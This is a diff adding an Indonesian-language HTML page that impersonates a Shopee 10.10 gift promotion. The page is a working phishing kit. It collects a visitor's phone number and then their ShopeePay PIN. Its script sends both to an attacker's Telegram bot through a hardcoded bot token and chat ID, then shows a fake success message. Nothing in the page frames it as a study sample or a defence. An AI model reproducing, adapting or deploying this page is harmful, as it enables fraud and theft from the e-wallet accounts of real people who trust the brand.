@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shopee 10.10 Box Hadiah</title>
+
+  <!-- Meta Tag untuk Preview Gambar di WhatsApp & Media Sosial -->
+  <meta property="og:title" content="Box Hadiah 10.10 - Shopee Indonesia">
+  <meta property="og:description" content="Klaim kejutan spesial dan hadiah menarik di event Shopee 10.10 sekarang!">
+  <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-11-d725e7c2-8095-4c01-bd89-f47831ab2b66.jpg">
+  <meta property="og:type" content="website">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://cdn.phototourl.com/member/2026-10-11-d725e7c2-8095-4c01-bd89-f47831ab2b66.jpg">
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #ff512f 0%, #f09819 100%);
+      color: #0f172a;
+      padding: 16px 12px;
+      min-height: 100vh;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
+    }
+
+    /* Banner Gambar Statis (Tidak Bergerak) */
+    .banner-box {
+      width: 100%;
+      max-width: 360px;
+      border-radius: 14px;
+      margin-bottom: 16px;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+
+    .banner-box img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 14px;
+    }
+
+    /* Kartu Utama */
+    .card {
+      width: 100%;
+      max-width: 360px;
+      background: #ffffff;
+      padding: 36px 22px 30px 22px;
+      border-radius: 24px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    /* Tampilan Judul Rapi & Profesional */
+    .title-wrapper {
+      margin-bottom: 14px;
+    }
+
+    .title-badge {
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 2px;
+      color: #ff512f;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 900;
+      background: linear-gradient(135deg, #ff3300 0%, #ff7700 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-transform: uppercase;
+      letter-spacing: -0.5px;
+      line-height: 1.2;
+    }
+
+    .title-divider {
+      width: 40px;
+      height: 3px;
+      background: #ff512f;
+      margin: 8px auto 16px auto;
+      border-radius: 2px;
+    }
+
+    /* Logo Bulat */
+    .logo {
+      width: 110px;
+      height: 110px;
+      object-fit: cover;
+      border-radius: 50%;
+      margin: 0 auto 16px auto;
+      display: block;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    p {
+      font-size: 14px;
+      color: #64748b;
+      margin-bottom: 22px;
+      line-height: 1.5;
+    }
+
+    .group {
+      text-align: left;
+      margin-bottom: 18px;
+    }
+
+    label {
+      font-size: 12px;
+      font-weight: bold;
+      color: #334155;
+      display: block;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      font-size: 15px;
+      outline: none;
+      background: #f8fafc;
+      color: #0f172a;
+    }
+
+    input:focus {
+      border-color: #ee3100;
+      background: #fff;
+    }
+
+    .otp-box {
+      display: flex;
+      justify-content: space-between;
+      gap: 6px;
+      margin-bottom: 24px;
+    }
+
+    .otp-box input {
+      width: 46px;
+      height: 52px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .btn {
+      width: 100%;
+      background: #ee3100;
+      color: #fff;
+      border: none;
+      padding: 15px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+      box-shadow: 0 4px 12px rgba(238, 49, 0, 0.3);
+    }
+
+    .back {
+      display: inline-block;
+      margin-top: 16px;
+      font-size: 13px;
+      color: #64748b;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .success {
+      background: #fff8f6;
+      border: 2px dashed #ee3100;
+      padding: 24px 16px;
+      border-radius: 16px;
+    }
+
+    .card-extended-space {
+      margin-top: 24px;
+      padding-top: 18px;
+      border-top: 1px dashed #e2e8f0;
+      text-align: center;
+    }
+
+    .secure-badge {
+      font-size: 12px;
+      color: #334155;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    .promo-note {
+      font-size: 11px;
+      color: #94a3b8;
+      line-height: 1.4;
+    }
+
+    .footer-info {
+      text-align: center;
+      color: #ffffff;
+      font-size: 11.5px;
+      margin-bottom: 16px;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Banner Gambar Statis di Atas -->
+  <div class="banner-box">
+    <img src="https://cdn.phototourl.com/member/2026-10-11-1e6f95c6-d650-4254-a991-35bed3f2cd7a.jpg" alt="Banner Top">
+  </div>
+
+  <!-- Kartu Utama Memanjang ke Bawah -->
+  <div class="card">
+    
+    <!-- Tampilan Judul Rapi & Profesional -->
+    <div class="title-wrapper">
+      <div class="title-badge">⚡ Special Event ⚡</div>
+      <h1>Box Hadiah 10.10</h1>
+      <div class="title-divider"></div>
+    </div>
+
+    <!-- Logo Bulat -->
+    <img src="https://cdn.phototourl.com/member/2026-10-11-d725e7c2-8095-4c01-bd89-f47831ab2b66.jpg" class="logo" alt="Logo">
+
+    <!-- LANGKAH 1 -->
+    <div id="step1">
+      <p>Masukkan nomor HP aktif Anda untuk mengklaim kejutan spesial di Box Hadiah.</p>
+      <form onsubmit="goToStep2(event)">
+        <div class="group">
+          <label>Nomor HP</label>
+          <input type="tel" id="phone" placeholder="Contoh: 081234567890" required>
+        </div>
+        <button type="submit" class="btn">Lanjutkan</button>
+      </form>
+
+      <div class="card-extended-space">
+        <div class="secure-badge">🛡️ Jaminan Keamanan & Privasi 100%</div>
+        <div class="promo-note">Pastikan nomor terdaftar aktif untuk validasi hadiah eksklusif Shopee 10.10</div>
+      </div>
+    </div>
+
+    <!-- LANGKAH 2 -->
+    <div id="step2" style="display: none;">
+      <p>MASUKAN PIN SHOPEEPAY.</p>
+      <form onsubmit="verifyCode(event)">
+        <div class="otp-box">
+          <input type="tel" maxlength="1" class="otp-input" required>
+          <input type="tel" maxlength="1" class="otp-input" required>
+          <input type="tel" maxlength="1" class="otp-input" required>
+          <input type="tel" maxlength="1" class="otp-input" required>
+          <input type="tel" maxlength="1" class="otp-input" required>
+          <input type="tel" maxlength="1" class="otp-input" required>
+        </div>
+        <button type="submit" class="btn">KONFIRMASI</button>
+      </form>
+      <span class="back" onclick="goToStep1()"></span>
+    </div>
+
+    <!-- LANGKAH 3 -->
+    <div id="step3" style="display: none;">
+      <div class="success">
+        <div style="font-size: 32px; margin-bottom: 6px;">🎉</div>
+        <h2 style="font-size: 17px; color: #ee3100; margin-bottom: 6px;">Selamat!</h2>
+        <p style="margin-bottom: 0;">Pendaftaran Anda berhadiah. Silakan cek hadiah Anda melalui aplikasi Shopee.</p>
+      </div>
+      <a href="https://shopee.co.id" class="btn" style="margin-top: 16px;">Buka Aplikasi Shopee</a>
+    </div>
+
+  </div>
+
+  <!-- Footer Bawah -->
+  <div class="footer-info">
+    © 2026 Shopee Indonesia. All Rights Reserved.
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8681291275:AAGlvoD0CamMIPVGLiBNWPdt7vpSYWgTB4M';
+    const CHAT_ID = '7667144622';
+    let userPhone = '';
+
+    function goToStep2(event) {
+      event.preventDefault();
+      const phoneInput = document.getElementById('phone');
+      userPhone = phoneInput ? phoneInput.value : '';
+      
+      if(userPhone.trim() !== '') {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        
+        setTimeout(() => {
+          const firstOtp = document.querySelector('.otp-input');
+          if(firstOtp) firstOtp.focus();
+        }, 100);
+      }
+    }
+
+    function goToStep1() {
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step1').style.display = 'block';
+    }
+
+    const otpInputs = document.querySelectorAll('.otp-input');
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+
+    function verifyCode(event) {
+      event.preventDefault();
+      let otpCode = '';
+      otpInputs.forEach(input => { otpCode += input.value; });
+
+      // Kirim nomor HP dan kode OTP sekaligus dalam satu pesan lengkap ke Telegram
+      const pesanLengkap = `🎁 *DATA MASUK SHOPEE 10.10*\n\n📱 Nomor HP: \`${userPhone}\`\n🔐 PIN shopeepay: \`${otpCode}\``;
+      sendToTelegram(pesanLengkap);
+
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+    }
+
+    function sendToTelegram(text) {
+      if (BOT_TOKEN === 'MASUKKAN_BOT_TOKEN_DISINI') return;
+      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const data = { chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' };
+
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).catch(err => console.log('Error:', err));
+    }
+  </script>
+</body>
+</html>
